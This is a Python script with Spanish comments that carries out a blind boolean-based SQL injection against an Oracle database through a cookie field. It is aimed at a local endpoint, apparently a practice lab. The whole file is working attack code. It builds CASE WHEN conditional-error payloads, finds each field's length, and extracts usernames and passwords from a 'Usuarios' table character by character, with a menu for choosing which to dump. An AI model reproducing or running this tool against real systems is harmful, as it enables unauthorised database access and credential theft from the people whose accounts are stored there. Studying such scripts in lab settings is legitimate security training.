import requests
from termcolor import colored
from yaspin import yaspin
import string
import signal
import sys
import time


# Controlar CTRL+C para una salida limpia
def signal_handler(sig, frame):
    print(colored('\n[!] Interrupción por el usuario. Saliendo...', "red"))
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

# Configuración del servidor
SERVER_URL = "http://127.0.0.1:5000/cookie"  # Endpoint para inyecciones booleanas


def construir_inyeccion(campo, posicion, caracter, indice):
    """
    Construye el payload de inyección SQL para extraer un carácter específico de una fila específica.
    """
    # Escapar apóstrofes en el carácter
    caracter_escapado = caracter.replace("'", "''")

    # Construir el payload para una fila específica
    payload = (
        f"d382yd8n21df4314fn817yf6834188ls023d8d' "
        f"AND (SELECT CASE WHEN (SUBSTR({campo}, {posicion}, 1) = '{caracter_escapado}') "
        f"THEN 1 ELSE 1/0 END FROM (SELECT {campo}, ROWNUM AS rn FROM Usuarios) WHERE rn={indice}) = 1 --"
    )

    return payload


def enviar_inyeccion(payload):
    """
    Envía la inyección al servidor y devuelve True si se detecta un cambio en la web, False en caso contrario.
    """
    data = {
        "tipo_sqli": "blind_boolean",
        "database": "Oracle",
        "cookie_value": payload
    }

    try:
        time.sleep(0.1)  # Opcional: Añadir un pequeño retraso para no sobrecargar el servidor
        response = requests.post(SERVER_URL, json=data, timeout=5, allow_redirects=True)

        # Lista de palabras clave que indican un cambio en la web
        success_keywords = ["Bienvenido de nuevo"]
        for keyword in success_keywords:
            if keyword.lower() in response.text.lower():
                return True
        return False
    except requests.exceptions.Timeout:
        print(colored("[!] Timeout durante la solicitud", "red"))
        return False
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Error en la petición: {e}", "red"))
        return False


def obtener_longitud_por_fila(campo, indice, max_length=40): # Asumimos que como máximo un campo tendrá 40 caracteres
    """
    Determina la longitud de un campo específico para una fila específica en la base de datos.
    """
    print(colored(f"\n[+] Determinando la longitud de '{campo}' para la fila {indice}...", "yellow"))
    for longitud in range(1, max_length + 1):
        # Construir el payload con el índice de la fila
        payload = (
            f"d382yd8n21df4314fn817yf6834188ls023d8d' "
            f"AND (SELECT CASE WHEN (LENGTH({campo}) = {longitud}) THEN 1 ELSE 1/0 END FROM "
            f"(SELECT {campo}, ROWNUM AS rn FROM Usuarios) WHERE rn={indice}) = 1 --"
        )
        with yaspin(text=f"Probando longitud {longitud} para la fila {indice}...", color=None, attrs=None) as spinner:
            time.sleep(0.1)  # Reducir la carga en el servidor
            if enviar_inyeccion(payload):
                spinner.ok("✔")
                print(colored(f"[*] La longitud de '{campo}' en la fila {indice} es: {longitud}", "green"))
                return longitud
            else:
                spinner.fail("✗")
    print(colored(f"[!] No se pudo determinar la longitud de '{campo}' en la fila {indice}.", "red"))
    return 0


def extraer_campo(campo, longitud, indice):
    """
    Extrae el valor del campo especificado carácter por carácter para una fila específica.
    """
    resultado = ""
    # Limitar el conjunto de caracteres a probar para mayor eficiencia
    caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
    print(colored(f"\n[+] Extrayendo el valor de '{campo}' para la fila {indice}...", "yellow"))

    for pos in range(1, longitud + 1):
        encontrado = False
        print(colored(f"\n[+] Extrayendo carácter {pos} de {longitud} para la fila {indice}...", "cyan"))
        with yaspin(text=f"Probando carácter en posición {pos}...", color=None, attrs=None) as spinner:
            for caracter in caracteres:
                inyeccion = construir_inyeccion(campo, pos, caracter, indice)
                if enviar_inyeccion(inyeccion):
                    resultado += caracter
                    spinner.text = f"Carácter {pos}: '{caracter}' encontrado."
                    spinner.ok("✔")
                    print(colored(f"[+] Inyección utilizada: {inyeccion}", "cyan"))
                    encontrado = True
                    break
                time.sleep(0.05)  # Opcional: Reducir la carga en el servidor
            if not encontrado:
                spinner.fail("✗")
                print(colored(f"[!] No se encontró un carácter coincidente en la posición {pos}.", "red"))
                resultado += '?'
    return resultado


def extraer_todos_los_campos(campo, max_filas=10):
    """
    Extrae todos los valores del campo especificado, iterando sobre todas las filas de la tabla.
    """
    resultados = []
    for indice in range(1, max_filas + 1):
        print(colored(f"\n[+] Extrayendo datos para la fila {indice}...", "yellow"))
        # Usar la nueva función para determinar la longitud de esta fila específica
        longitud = obtener_longitud_por_fila(campo, indice)
        if longitud == 0:
            print(colored(f"[!] No se encontró longitud para la fila {indice}. Asumiendo fin de datos.", "red"))
            break
        # Extraer el valor de esta fila específica
        valor = extraer_campo(campo, longitud, indice)
        resultados.append(valor)
        print(colored(f"[+] Valor extraído para la fila {indice}: {valor}", "green"))
    return resultados

def mostrar_banner():
    print(colored("   ___  ___         __    ___            __            ", "cyan"))
    print(colored("  / _ )/ (_)__  ___/ /   / _ )___  ___  / /__ ___ ____ ", "cyan"))
    print(colored(" / _  / / / _ \\/ _  /   / _  / _ \\/ _ \\/ / -_) _ `/ _ \\", "cyan"))
    print(colored("/____/_/_/_//_/\\_,_/   /____/\\___/\\___/_/\\__/\\_,_/_//_/", "cyan"))
    print(colored("   ________    __   ____       ____        _      __      ", "yellow"))
    print(colored("  / __/ __ \\  / /  /  _/      / __/_______(_)__  / /_     ", "yellow"))
    print(colored(" _\\ \\/ /_/ / / /___/ /      _\\ \\/ __/ __/ / _ \\/ __/     ", "yellow"))
    print(colored("/___/\\___\\_\\/____/___/     /___/\\__/_/ /_/ .__/\\__/      ", "yellow"))
    print(colored("                                        /_/             ", "yellow"))

def menu():
    """
    Muestra el menú interactivo para que el usuario seleccione el campo a extraer.
    """
    mostrar_banner()
    print(colored("Selecciona qué deseas extraer de la BD:", "yellow"))
    print(colored("1. Usuarios", "magenta"))
    print(colored("2. Contraseñas", "magenta"))

    while True:
        opcion = input("Opción (1 o 2): ").strip()
        if opcion == "1":
            campo = "username"
            break
        elif opcion == "2":
            campo = "password"
            break
        else:
            print(colored("[!] Introduce una opción válida (1 o 2).", "red"))

    return campo


def main():
    """
    Función principal que coordina el proceso de inyección SQL para extraer múltiples filas.
    """
    start_time = time.time()
    campo = menu()
    resultados = extraer_todos_los_campos(campo)
    print(colored("\n[+] Resultados completos:", "blue", attrs=["bold"]))
    for i, resultado in enumerate(resultados, start=1):
        if campo == "username":
            print(colored(f"Usuario {i}: {resultado}", "cyan"))
        else:
            print(colored(f"Contraseña {i}: {resultado}", "green"))

    print(colored(f"\n[+] Tiempo de ejecución: {round(time.time() - start_time, 2)} segundos", "blue", attrs=["bold"]))


if __name__ == "__main__":
    main()
